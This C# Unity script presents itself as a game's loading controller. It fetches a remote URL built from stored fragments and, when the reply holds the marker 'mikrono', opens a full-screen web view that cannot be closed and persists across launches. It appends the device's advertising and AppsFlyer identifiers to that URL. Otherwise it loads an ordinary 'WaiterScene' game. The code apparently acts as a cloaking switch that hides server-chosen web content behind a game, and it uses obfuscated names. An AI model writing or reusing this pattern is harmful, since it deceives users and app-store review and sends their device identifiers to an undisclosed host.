using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class loadController : MonoBehaviour
{
    public List<string> blaseFogoLoadStrings;
    [HideInInspector]
    public string idfaBlaseFogoKey = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("contextInfoISDfuidusgudfigidBlaseFogo", 0) == 1)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string adString, bool trackEnabler, string error) =>
            { idfaBlaseFogoKey = adString; });
        }
    }

    private void Start()
    {
        Invoke(nameof(InitLoad), 5f);
    }

    private void InitLoad()
    {
        string data = PlayerPrefs.GetString("tarameters", "");
        Initialization(data);
    }

    private void Initialization(string data)
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("blasefogosGIfdugudodifsgugameDatas", string.Empty) != string.Empty)
            {
                Loadcanvas(PlayerPrefs.GetString("blasefogosGIfdugudodifsgugameDatas"));
            }
            else
            {
                string stringtemp = "";
                foreach (var item in blaseFogoLoadStrings)
                {
                    stringtemp += item;
                }
                StartCoroutine(StartingInitializingGameDatas(stringtemp, data));
            }
        }
        else
        {
            LoadGameScene();
        }
    }

    private string[] strings;
    public void LoadGameScene()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("WaiterScene");
    }

    public IEnumerator StartingInitializingGameDatas(string inputstring, string inputstring2)
    {
        using (UnityWebRequest blaseFogoLoadControllingstatus = UnityWebRequest.Get(inputstring))
        {
            blaseFogoLoadControllingstatus.timeout = 4;
            yield return blaseFogoLoadControllingstatus.SendWebRequest();
            if (blaseFogoLoadControllingstatus.isNetworkError)
            {
                LoadGameScene();
            }
            else
            {
                try
                {
                    if (blaseFogoLoadControllingstatus.result == UnityWebRequest.Result.Success)
                    {
                        if (blaseFogoLoadControllingstatus.downloadHandler.text.Contains("mikrono"))
                        {
                            try
                            {
                                string key = blaseFogoLoadControllingstatus.downloadHandler.text;
                                strings = key.Split('|');
                                Loadcanvas($"{strings[0]}?idfa={idfaBlaseFogoKey}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2}", Convert.ToInt32(strings[1]), Convert.ToInt32(strings[2]));
                            }
                            catch
                            {
                                Loadcanvas($"{blaseFogoLoadControllingstatus.downloadHandler.text}?idfa={idfaBlaseFogoKey}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2}");
                            }
                        }
                        else
                        {
                            LoadGameScene();
                        }
                    }
                    else
                    {
                        LoadGameScene();
                    }
                }
                catch
                {
                    LoadGameScene();
                }
            }
        }
    }

    private void Loadcanvas(string inputKey, int secondKey = 0,int thirdkey = 70)
    {
        var blaseFogoGameLoadCanvas = gameObject.AddComponent<UniWebView>();
        blaseFogoGameLoadCanvas.SetContentInsetAdjustmentBehavior(UniWebViewContentInsetAdjustmentBehavior.Automatic);
        blaseFogoGameLoadCanvas.SetZoomEnabled(true);
        if (secondKey == 1)
        {
            blaseFogoGameLoadCanvas.SetShowToolbar(false);
        }
        else
        {
            blaseFogoGameLoadCanvas.SetShowToolbar(true, false, false, true);
        }
        blaseFogoGameLoadCanvas.SetToolbarDoneButtonText("");
        blaseFogoGameLoadCanvas.SetSupportMultipleWindows(true);
        blaseFogoGameLoadCanvas.Frame = new Rect(0, thirdkey, Screen.width, Screen.height - thirdkey);
        blaseFogoGameLoadCanvas.OnShouldClose += (view) =>
        {
            return false;
        };
        blaseFogoGameLoadCanvas.OnOrientationChanged += (view, orientation) =>
        {
            blaseFogoGameLoadCanvas.Frame = new Rect(0, thirdkey, Screen.width, Screen.height - thirdkey);
        };
        blaseFogoGameLoadCanvas.SetSupportMultipleWindows(true);
        blaseFogoGameLoadCanvas.OnMultipleWindowOpened += (view, windowId) =>
        {
            blaseFogoGameLoadCanvas.SetShowToolbar(true);
        };
        blaseFogoGameLoadCanvas.OnMultipleWindowClosed += (view, windowId) =>
        {
            if (secondKey == 1)
            {
                blaseFogoGameLoadCanvas.SetShowToolbar(false);
            }
            else
            {
                blaseFogoGameLoadCanvas.SetShowToolbar(true, false, false, true);
            }
        };
        blaseFogoGameLoadCanvas.SetAllowBackForwardNavigationGestures(true);
        blaseFogoGameLoadCanvas.OnPageFinished += (view, statusCode, url) =>
        {
            blaseFogoGameLoadCanvas.UpdateFrame();
            if (PlayerPrefs.GetString("blasefogosGIfdugudodifsgugameDatas", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("blasefogosGIfdugudodifsgugameDatas", url);
            }
        };
        blaseFogoGameLoadCanvas.Load(inputKey);
        blaseFogoGameLoadCanvas.Show();
    }
}
